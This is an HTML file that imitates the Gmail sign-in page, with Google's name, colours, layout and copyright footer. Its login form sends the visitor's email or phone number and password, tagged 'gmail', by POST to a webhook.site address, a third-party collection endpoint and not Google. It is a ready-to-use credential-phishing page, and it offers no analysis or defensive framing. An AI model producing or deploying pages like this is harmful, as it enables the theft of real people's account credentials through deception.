<html>
<head>
    <title>Gmail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            width: 450px;
            padding: 48px 40px 36px;
        }
        .logo {
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #EA4335;
        }
        .header {
            font-size: 24px;
            margin-bottom: 30px;
            color: #202124;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 16px;
            margin: 12px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input[type="submit"] {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 4px;
            width: 100%;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        .footer {
            margin-top: 30px;
            color: #5f6368;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Gmail</div>
        <div class="header">Sign in</div>

        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
            <input type="hidden" name="site" value="gmail">
            <input type="text" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="submit" value="Next">
        </form>

        <div class="footer">
            <a href="#" style="color: #1a73e8; text-decoration: none;">Forgot email?</a> ·
            <a href="#" style="color: #1a73e8; text-decoration: none;">Guest mode</a>
            <p>Google © 2024</p>
        </div>
    </div>
</body>
</html>
